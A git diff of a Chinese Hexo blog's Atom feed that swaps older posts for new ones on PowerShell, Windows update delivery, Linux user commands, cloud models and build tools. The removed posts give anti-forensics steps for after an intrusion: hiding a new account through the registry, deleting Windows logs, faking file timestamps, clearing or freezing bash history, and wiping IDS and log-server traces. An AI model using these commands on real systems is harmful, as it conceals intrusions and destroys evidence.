@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://howiezhao.github.io/"/>
-  <updated>2018-05-02T08:47:41.431Z</updated>
+  <updated>2018-07-16T09:43:40.495Z</updated>
   <id>https://howiezhao.github.io/</id>
   
   <author>
@@ -16,83 +16,119 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>反取证之Windows</title>
-    <link href="https://howiezhao.github.io/2018/05/02/anti-forensics-windows/"/>
-    <id>https://howiezhao.github.io/2018/05/02/anti-forensics-windows/</id>
-    <published>2018-05-02T06:02:03.000Z</published>
-    <updated>2018-05-02T08:47:41.431Z</updated>
+    <title>关于PowerShell</title>
+    <link href="https://howiezhao.github.io/2018/07/16/about-powershell/"/>
+    <id>https://howiezhao.github.io/2018/07/16/about-powershell/</id>
+    <published>2018-07-16T06:56:07.000Z</published>
+    <updated>2018-07-16T09:43:40.495Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="MACE时间"><a href="#MACE时间" class="headerlink" title="MACE时间"></a>MACE时间</h2><p>和<a href="https://howiezhao.github.io/2018/05/02/anti-forensics-linux/">反取证之Linux</a>中的一样，Windows也有MAC时间，不过在Windows中，C指的是Created，即创建时间，Windows中默认显示的是修改时间，另外，在Windows的NTFS文件系统中还有E时间，即MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除E时间，同样，meterpreter中的<code>timestomp</code>命令可以方便的修改MACE时间。</p>
-<h2 id="隐藏新建账号"><a href="#隐藏新建账号" class="headerlink" title="隐藏新建账号"></a>隐藏新建账号</h2><p>当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0</div></pre></td></tr></table></figure></p>
-<p>注意：这种隐藏只是在登录界面的隐藏，用户使用<code>net user</code>或“本地用户和组”仍然可以查到新建的账户。</p>
-<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>Windows系统日志文件一般存放在Windows文件夹下，可以使用如下命令删除之：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">del %windir%\*.<span class="built_in">log</span> /a/s/q/f</div></pre></td></tr></table></figure></p>
-<p>另外，meterpreter中的<code>clearev</code>命令可以删除事件查看器中的日志信息。</p>
-<p><strong>最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
+    <content type="html"><![CDATA[<p>PowerShell是微软用来取代CMD的一个强大的Shell。</p>
+<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下：</p>
+<ul>
+<li>Windows Server 2003：PowerShell 1.0</li>
+<li>Windows 7：PowerShell 2.0</li>
+<li>Windows 8：PowerShell 3.0</li>
+<li>Windows 10：PowerShell 4.0</li>
+</ul>
+<a id="more"></a>
+<h2 id="优势及劣势"><a href="#优势及劣势" class="headerlink" title="优势及劣势"></a>优势及劣势</h2><p>PowerShell相较于CMD的优势是不言而喻的，相较于Unix中的Shell，它的优势主要体现在2方面：面向对象特性以及与.NET的深度结合。<br>劣势当然也有，相较于CMD，至今为止它的启动速度仍然较慢，相较于Unix中的Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到PowerShell。</p>
+<h2 id="Cmdlets与pipeline"><a href="#Cmdlets与pipeline" class="headerlink" title="Cmdlets与pipeline"></a>Cmdlets与pipeline</h2><p>Cmdlets与pipeline是PowerShell中的两个核心概念，</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>PowerShell中的大多数常用命令都有对应于Linux中相关命令的别名，比如ls、mv、ps、cat、kill、wget等，下面介绍的命令为PowerShell所不同于Linux中的命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Get-Host <span class="comment">#查看PowerShell版本信息</span></div><div class="line"><span class="built_in">help</span> <span class="comment">#查看帮助信息</span></div><div class="line">Install-Module <span class="comment">#从powershellgallery.com下载安装第三方模块</span></div><div class="line">Import-Module <span class="comment">#导入模块，安装的模块需要先导入才能使用</span></div></pre></td></tr></table></figure></p>
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><ul>
+<li><a href="https://github.com/dahlbyk/posh-git" target="_blank" rel="external">posh-git</a>：PowerShell中的Git增强模块</li>
+<li><a href="https://github.com/JanDeDobbeleer/oh-my-posh" target="_blank" rel="external">oh-my-posh</a>：类似于oh-my-zsh</li>
+<li><a href="https://github.com/lzybkr/PSReadLine" target="_blank" rel="external">PSReadline</a>：一个增强的命令行编辑模块</li>
+<li><a href="https://github.com/JulianChow94/Windows-screenFetch" target="_blank" rel="external">windows-screenfetch</a>：Windows下的screenfetch模块</li>
+</ul>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;MACE时间&quot;&gt;&lt;a href=&quot;#MACE时间&quot; class=&quot;headerlink&quot; title=&quot;MACE时间&quot;&gt;&lt;/a&gt;MACE时间&lt;/h2&gt;&lt;p&gt;和&lt;a href=&quot;https://howiezhao.github.io/2018/05/02/anti-
+      &lt;p&gt;PowerShell是微软用来取代CMD的一个强大的Shell。&lt;/p&gt;
+&lt;h2 id=&quot;版本&quot;&gt;&lt;a href=&quot;#版本&quot; class=&quot;headerlink&quot; title=&quot;版本&quot;&gt;&lt;/a&gt;版本&lt;/h2&gt;&lt;p&gt;在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows Server 2003：PowerShell 1.0&lt;/li&gt;
+&lt;li&gt;Windows 7：PowerShell 2.0&lt;/li&gt;
+&lt;li&gt;Windows 8：PowerShell 3.0&lt;/li&gt;
+&lt;li&gt;Windows 10：PowerShell 4.0&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
       <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
     
-    
-      <category term="渗透" scheme="https://howiezhao.github.io/tags/%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="计算机取证" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
     
       <category term="Windows" scheme="https://howiezhao.github.io/tags/Windows/"/>
     
   </entry>
   
   <entry>
-    <title>反取证之Linux</title>
-    <link href="https://howiezhao.github.io/2018/05/02/anti-forensics-linux/"/>
-    <id>https://howiezhao.github.io/2018/05/02/anti-forensics-linux/</id>
-    <published>2018-05-01T16:02:31.000Z</published>
-    <updated>2018-05-02T08:13:43.283Z</updated>
+    <title>Windows10的传递优化</title>
+    <link href="https://howiezhao.github.io/2018/07/16/delivery-optimization/"/>
+    <id>https://howiezhao.github.io/2018/07/16/delivery-optimization/</id>
+    <published>2018-07-16T03:27:28.000Z</published>
+    <updated>2018-07-16T03:56:55.923Z</updated>
     
-    <content type="html"><![CDATA[<p>后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history：</p>
-<h2 id="MAC时间"><a href="#MAC时间" class="headerlink" title="MAC时间"></a>MAC时间</h2><p>MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用<code>ls -l</code>默认查看的是修改时间，要查看其余2个时间，可以加参数<code>ls -l --time=atime/ctime</code>，另一个查看MAC时间的命令是<code>stat</code>。使用<code>touch -d &quot;5 days ago&quot;</code>或<code>touch -t 1805021030</code>可以修改MAC中的MA时间。meterpreter中的<code>timestomp</code>命令可以方便的修改MAC时间。<br><a id="more"></a></p>
-<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>Linux中的日志文件主要有/var/log/auth.log、/var/log/secure、/var/log/wtmp、/var/log/btmp、/var/log/lastlog、/var/log/faillog。<br>Debian系的auth.log文件与RedHat系的secure文件都记录了系统的登录日志，<code>last</code>命令用于查看登录日志以及重启日志，文件位于/var/log/wtmp；<code>lastb</code>命令用于查看登录失败日志，文件位于/var/log/btmp；<code>lastlog</code>命令用于查看所有用户最近一次登录日志，文件位于/var/log/lastlog；<code>faillog</code>命令与<code>lastlog</code>命令一样，用于查看用户登录失败日志，文件位于/var/log/faillog，此命令仅限于Debian系。</p>
-<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>Linux中，每次输入的命令都会记录在用户文件夹中的.bash_history文件中，默认记录1000条命令，使用<code>history</code>命令即可查看，清除记录的方法是使用<code>history -c</code>命令。另一种清除记录的方法是更改.bash_history文件的属性，使用命令：<code>chattr +i .bash_history</code>使其不可被更改，从而无法向其写入任何数据。</p>
-<p><strong>最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
+    <content type="html"><![CDATA[<p>为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即<a href="https://privacy.microsoft.com/zh-CN/windows-10-windows-update-delivery-optimization" target="_blank" rel="external"><strong>传递优化</strong></a>(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。<br>开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history：&lt;/p&gt;
-&lt;h2 id=&quot;MAC时间&quot;&gt;&lt;a href=&quot;#MAC时间&quot; class=&quot;headerlink&quot; title=&quot;MAC时间&quot;&gt;&lt;/a&gt;MAC时间&lt;/h2&gt;&lt;p&gt;MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用&lt;code&gt;ls -l&lt;/code&gt;默认查看的是修改时间，要查看其余2个时间，可以加参数&lt;code&gt;ls -l --time=atime/ctime&lt;/code&gt;，另一个查看MAC时间的命令是&lt;code&gt;stat&lt;/code&gt;。使用&lt;code&gt;touch -d &amp;quot;5 days ago&amp;quot;&lt;/code&gt;或&lt;code&gt;touch -t 1805021030&lt;/code&gt;可以修改MAC中的MA时间。meterpreter中的&lt;code&gt;timestomp&lt;/code&gt;命令可以方便的修改MAC时间。&lt;br&gt;
+      &lt;p&gt;为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即&lt;a href=&quot;https://privacy.microsoft.com/zh-CN/windows-10-windows-update-delivery-optimization
     
     </summary>
     
       <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
     
     
-      <category term="渗透" scheme="https://howiezhao.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+      <category term="Windows" scheme="https://howiezhao.github.io/tags/Windows/"/>
     
-      <category term="计算机取证" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/"/>
+  </entry>
+  
+  <entry>
+    <title>useradd与adduser</title>
+    <link href="https://howiezhao.github.io/2018/07/16/useradd-adduser/"/>
+    <id>https://howiezhao.github.io/2018/07/16/useradd-adduser/</id>
+    <published>2018-07-16T02:44:41.000Z</published>
+    <updated>2018-07-16T03:14:08.227Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Linux中创建用户可以用<code>useradd</code>或者<code>adduser</code>，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。</p>
+<h2 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h2><p>当使用<code>adduser howie</code>命令时，系统除了创建howie用户，还会自动创建用户主目录、同名用户组、登录Shell等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。</p>
+<h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p>当使用<code>useradd howie</code>命令时，系统只会创建howie用户，而不会创建用户密码、用户主目录、同名用户组、登录shell等，若要指定密码，可以接着采用<code>passwd howie</code>命令。其次，<code>useradd</code>有众多参数，我们可以通过使用这些参数来达到和<code>adduser</code>一样的效果，如<code>useradd -d /home/howie -m -s /bin/bash howie</code>，不过注意之后还得使用<code>passwd</code>命令创建密码，当然也可以使用<code>-p</code>参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。</p>
+<h2 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h2><p>当使用<code>userdel howie</code>命令时，系统只会删除howie用户，并不会删除用户主目录，因此可以使用<code>-r</code>参数。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在Linux中创建用户可以用&lt;code&gt;useradd&lt;/code&gt;或者&lt;code&gt;adduser&lt;/code&gt;，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。&lt;/p&gt;
+&lt;h2 id=&quot;a
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
     
       <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
     
   </entry>
   
   <entry>
-    <title>形而上与形而下</title>
-    <link href="https://howiezhao.github.io/2018/05/01/metaphysics-physics/"/>
-    <id>https://howiezhao.github.io/2018/05/01/metaphysics-physics/</id>
-    <published>2018-05-01T15:30:51.000Z</published>
-    <updated>2018-05-01T16:00:05.782Z</updated>
+    <title>云服务的三种模式</title>
+    <link href="https://howiezhao.github.io/2018/07/15/xaas/"/>
+    <id>https://howiezhao.github.io/2018/07/15/xaas/</id>
+    <published>2018-07-15T08:58:01.000Z</published>
+    <updated>2018-07-16T09:39:36.674Z</updated>
     
-    <content type="html"><![CDATA[<p>形而上者谓之道，形而下者谓之器。</p>
+    <content type="html"><![CDATA[<p>云服务的模式一般有IaaS、PaaS、SaaS三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。</p>
+<h2 id="IaaS"><a href="#IaaS" class="headerlink" title="IaaS"></a>IaaS</h2><p><strong>IaaS</strong>，Infrastructure as a Service(基础设施即服务)，云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是<strong>VPS</strong>，即Virtual Private Server(虚拟专用服务器)，这类服务一般提供必要的Shell接口，可使用户连接到操作系统进行相关配置，常见的VPS厂商有<a href="https://aws.amazon.com/cn/ec2/" target="_blank" rel="external">Amazon EC2</a>、<a href="https://www.aliyun.com/product/ecs" target="_blank" rel="external">阿里云 ECS</a>等。</p>
+<h2 id="PaaS"><a href="#PaaS" class="headerlink" title="PaaS"></a>PaaS</h2><p><strong>PaaS</strong>，Platform as a Service(平台即服务)，云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是<strong>虚拟空间</strong>，这类服务一般会提供必要的Web服务器、数据库等，用户可以直接在其上部署Web应用，我用过的虚拟空间有<a href="http://www.laoxuehost.com/" target="_blank" rel="external">老薛主机</a>，常见的PaaS厂商有<a href="https://cloud.google.com/appengine/" target="_blank" rel="external">Google App Engine</a>。</p>
+<h2 id="SaaS"><a href="#SaaS" class="headerlink" title="SaaS"></a>SaaS</h2><p><strong>SaaS</strong>，Software as a Service(软件即服务)，云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的Hexo、WordPress等。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;形而上者谓之道，形而下者谓之器。&lt;/p&gt;
-
+      &lt;p&gt;云服务的模式一般有IaaS、PaaS、SaaS三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。&lt;/p&gt;
+&lt;h2 id=&quot;IaaS&quot;&gt;&lt;a href=&quot;#IaaS&quot; class=&quot;headerlink&quot; title=&quot;IaaS&quot;&gt;&lt;/a&gt;Iaa
     
     </summary>
     
@@ -102,173 +138,339 @@
   </entry>
   
   <entry>
-    <title>Sniper、Battering ram、Pitchfork、Cluster bomb的区别</title>
-    <link href="https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/"/>
-    <id>https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/</id>
-    <published>2018-05-01T14:45:55.000Z</published>
-    <updated>2018-05-01T15:58:14.824Z</updated>
+    <title>编译与构建</title>
+    <link href="https://howiezhao.github.io/2018/07/15/compile-build/"/>
+    <id>https://howiezhao.github.io/2018/07/15/compile-build/</id>
+    <published>2018-07-15T06:29:13.000Z</published>
+    <updated>2018-07-15T08:50:54.648Z</updated>
     
-    <content type="html"><![CDATA[<p>Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]：</p>
-<h2 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h2><p>Sniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下：</p>
-<table>
-<thead>
-<tr>
-<th>Request</th>
-<th>Position1(default:x)</th>
-<th>Position2(default:y)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>#1</td>
-<td>1</td>
-<td>y</td>
-</tr>
-<tr>
-<td>#2</td>
-<td>2</td>
-<td>y</td>
-</tr>
-<tr>
-<td>#3</td>
-<td>x</td>
-<td>1</td>
-</tr>
-<tr>
-<td>#4</td>
-<td>x</td>
-<td>2</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram"></a>Battering ram</h2><p>Battering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下：</p>
-<table>
-<thead>
-<tr>
-<th>Request</th>
-<th>Position1</th>
-<th>Position2</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>#1</td>
-<td>1</td>
-<td>1</td>
-</tr>
-<tr>
-<td>#2</td>
-<td>2</td>
-<td>2</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h2><p>Pitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下：</p>
-<table>
-<thead>
-<tr>
-<th>Request</th>
-<th>Position1</th>
-<th>Position2</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>#1</td>
-<td>1</td>
-<td>a</td>
-</tr>
-<tr>
-<td>#2</td>
-<td>2</td>
-<td>b</td>
-</tr>
-</tbody>
-</table>
-<h2 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb"></a>Cluster bomb</h2><p>Cluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下：</p>
-<table>
-<thead>
-<tr>
-<th>Request</th>
-<th>Position1</th>
-<th>Position2</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>#1</td>
-<td>1</td>
-<td>a</td>
-</tr>
-<tr>
-<td>#2</td>
-<td>1</td>
-<td>b</td>
-</tr>
-<tr>
-<td>#3</td>
-<td>1</td>
-<td>c</td>
-</tr>
-<tr>
-<td>#4</td>
-<td>1</td>
-<td>d</td>
-</tr>
-<tr>
-<td>#5</td>
-<td>2</td>
-<td>a</td>
-</tr>
-<tr>
-<td>#6</td>
-<td>2</td>
-<td>b</td>
-</tr>
-<tr>
-<td>#7</td>
-<td>2</td>
-<td>c</td>
-</tr>
-<tr>
-<td>#8</td>
-<td>2</td>
-<td>d</td>
-</tr>
-</tbody>
-</table>
+    <content type="html"><![CDATA[<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><strong>编译(compile)</strong>，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为<strong>编译器(compiler)</strong>。但要注意，编译器在同一时刻只能转换一个编译单元，所谓<strong>编译单元</strong>是指单个的源文件。目前在Linux中使用最广的编译器是<strong>GCC</strong>，即GNU Compiler Collection(GNU编译器套装)，GCC的原名为GNU C Compiler(GNU C语言编译器)，因为在后续逐渐支持了C++、Java等更多的语言，所以更改了其缩写的含义。使用GCC编译C语言源代码的一般格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ gcc test.c -o <span class="built_in">test</span></div></pre></td></tr></table></figure></p>
+<p>若不指定生成文件，则默认生成a.out。<br><a id="more"></a></p>
+<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><p>程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标，而这个工具就是<strong>构建系统(build system)</strong>，构建系统所作的就是<strong>构建(build)</strong>，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。在Linux中使用最广的构建系统是<strong>GNU make</strong>，它会读取<strong>makefile</strong>文件中的配置信息来完成构建，makefile的简要格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">editor : main.o text.o</div><div class="line">    gcc -o editor main.o text.o</div><div class="line">main.o : main.c def.h</div><div class="line">    gcc -c main.c  <span class="comment">#-c参数指定生成.o文件</span></div><div class="line">text.o : text.c com.h</div><div class="line">    gcc -c text.c</div><div class="line">install : editor</div><div class="line">    mv editor /usr/<span class="built_in">local</span></div></pre></td></tr></table></figure></p>
+<p>冒号前面为<strong>target</strong>，即要生成的文件；冒号后面为<strong>dependencies</strong>，即被依赖的文件；每一个target:dependencies对的下一行为要执行的命令。当make不带参数时，默认执行第一个target。target也可以是要求make要完成的动作，执行这种target后并不能得到和target同名的文件，因此，也称做<strong>伪target</strong>，如第7行所示。dependencies可以为空，如常用的target为clean时，就没有依赖，只有命令。<br>当输入<code>make</code>或<code>make editor</code>，即可开始构建。若editor这个target文件不存在，或者main.o、text.o这两个依赖文件被修改，都会导致make调用其下的命令<code>gcc -o editor main.o text.o</code>；接下来，由于引用到main.o和text.o，make会检查main.o的依赖main.c、def.h有无更新，如果有，则执行其下的命令<code>gcc -c main.c</code>；同理，也适用于text.o。当输入<code>make install</code>，make会检查install的依赖editor是否是最新，如果是，则执行其下的命令<code>mv editor /usr/local</code>。<br>makefile中也可以包含<strong>宏</strong>，上面的文件使用宏后如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">OBJECTS = main.o text.o</div><div class="line">INSTALL_PATH = /usr/<span class="built_in">local</span></div><div class="line">editor : $(OBJECTS)</div><div class="line">    gcc -o editor $(OBJECTS)</div><div class="line">main.o : main.c</div><div class="line">    gcc -c main.c</div><div class="line">text.o : text.c</div><div class="line">    gcc -c text.c</div><div class="line">install : editor</div><div class="line">    mv editor $(INSTALL_PATH)</div></pre></td></tr></table></figure></p>
+<h2 id="另外的"><a href="#另外的" class="headerlink" title="另外的"></a>另外的</h2><p>为了在Windows中使用GCC，诞生了<a href="http://www.mingw.org/" target="_blank" rel="external"><strong>MinGW</strong></a> 项目，即Minimalist GNU for Windows(适用于Windows的极简GNU)，它是将GCC编译器和GNU Binutils移植到Win32平台下的产物，又被称为mingw32。另有可用于产生32位及64位Windows可执行文件的<a href="https://mingw-w64.org/doku.php/start" target="_blank" rel="external"><strong>MinGW-w64</strong></a>项目，是从原MinGW项目产生的分支。<br>Java世界中使用最广的构建系统是<strong>Maven</strong>，而在Android Studio中则使用到了后起之秀<strong>Gradle</strong>。<br>C语言从源代码到可执行文件的过程依次经过了<strong>预处理</strong>、<strong>编译</strong>、<strong>链接</strong>这几个步骤，即我们常说的GCC是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]：&lt;/p&gt;
-&lt;h2
+      &lt;h2 id=&quot;编译&quot;&gt;&lt;a href=&quot;#编译&quot; class=&quot;headerlink&quot; title=&quot;编译&quot;&gt;&lt;/a&gt;编译&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;编译(compile)&lt;/strong&gt;，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为&lt;strong&gt;编译器(compiler)&lt;/strong&gt;。但要注意，编译器在同一时刻只能转换一个编译单元，所谓&lt;strong&gt;编译单元&lt;/strong&gt;是指单个的源文件。目前在Linux中使用最广的编译器是&lt;strong&gt;GCC&lt;/strong&gt;，即GNU Compiler Collection(GNU编译器套装)，GCC的原名为GNU C Compiler(GNU C语言编译器)，因为在后续逐渐支持了C++、Java等更多的语言，所以更改了其缩写的含义。使用GCC编译C语言源代码的一般格式如下：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ gcc test.c -o &lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;若不指定生成文件，则默认生成a.out。&lt;br&gt;
     
     </summary>
     
       <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
     
     
-      <category term="渗透" scheme="https://howiezhao.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+  </entry>
+  
+  <entry>
+    <title>Linux系统加固</title>
+    <link href="https://howiezhao.github.io/2018/05/19/linux-reinforcement/"/>
+    <id>https://howiezhao.github.io/2018/05/19/linux-reinforcement/</id>
+    <published>2018-05-19T05:59:05.000Z</published>
+    <updated>2018-05-20T14:30:33.684Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="账户与口令"><a href="#账户与口令" class="headerlink" title="账户与口令"></a>账户与口令</h2><h2 id="服务安全"><a href="#服务安全" class="headerlink" title="服务安全"></a>服务安全</h2><h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;账户与口令&quot;&gt;&lt;a href=&quot;#账户与口令&quot; class=&quot;headerlink&quot; title=&quot;账户与口令&quot;&gt;&lt;/a&gt;账户与口令&lt;/h2&gt;&lt;h2 id=&quot;服务安全&quot;&gt;&lt;a href=&quot;#服务安全&quot; class=&quot;headerlink&quot; title=&quot;服务安全&quot;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
     
   </entry>
   
   <entry>
-    <title>URI与URL的区别</title>
-    <link href="https://howiezhao.github.io/2018/04/29/url-uri/"/>
-    <id>https://howiezhao.github.io/2018/04/29/url-uri/</id>
-    <published>2018-04-29T08:40:08.000Z</published>
-    <updated>2018-04-29T10:43:45.751Z</updated>
+    <title>Windows系统加固</title>
+    <link href="https://howiezhao.github.io/2018/05/19/windows-reinforcement/"/>
+    <id>https://howiezhao.github.io/2018/05/19/windows-reinforcement/</id>
+    <published>2018-05-19T05:58:51.000Z</published>
+    <updated>2018-05-19T06:00:56.852Z</updated>
     
-    <content type="html"><![CDATA[<p>URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。</p>
-<p>URL，全称”Uniform Resource Locator”，中文“统一资源定位符”，URL是URI的子集。示例如下：<br><code>https://howiezhao.github.io/2018/04/29/url-uri/</code><br>上面这个URL唯一标识了互联网中一台服务器上的一篇文章。</p>
